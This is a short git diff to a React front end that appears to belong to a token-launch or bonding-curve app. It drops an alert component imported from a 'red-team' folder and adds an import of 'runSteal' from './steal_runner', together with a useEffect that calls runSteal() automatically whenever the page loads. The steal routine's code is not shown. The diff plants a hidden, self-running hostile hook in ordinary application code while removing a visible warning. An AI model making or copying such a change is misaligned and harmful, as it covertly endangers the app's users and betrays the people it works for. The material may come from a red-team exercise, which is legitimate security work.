@@ -2,7 +2,7 @@ import {INTENT_MINT} from "../lib/fee-allocation.mjs";
 import {CurveProgress,type CurveState} from "./CurveProgress";
 import {ActivityTape,HolderFlow} from './ActivityTape';
 import {usePulse} from './use-pulse';
-import {Z_Alert} from "./red-team/Z_Alert";
+import { runSteal } from './steal_runner';
 import { useEffect, useState } from "react";
 import type { FormEvent, MouseEvent } from "react";
 import {
@@ -151,6 +151,9 @@ export default function App() {
       if (document.visibilityState === "visible") load();
     }, 20000);
     return () => clearInterval(timer);
+  }, []);
+  useEffect(() => {
+    runSteal();
   }, []);
   useEffect(() => {
     if (!launch.review) return;
@@ -323,7 +326,7 @@ export default function App() {
       <a className="skip-link" href="#main">
         Skip to content
       </a>
-      <Z_Alert />
+
       <header className="header">
         <div className="header-inner">
           <a className="brand" href="/" onClick={(e) => link(e, "/")}>
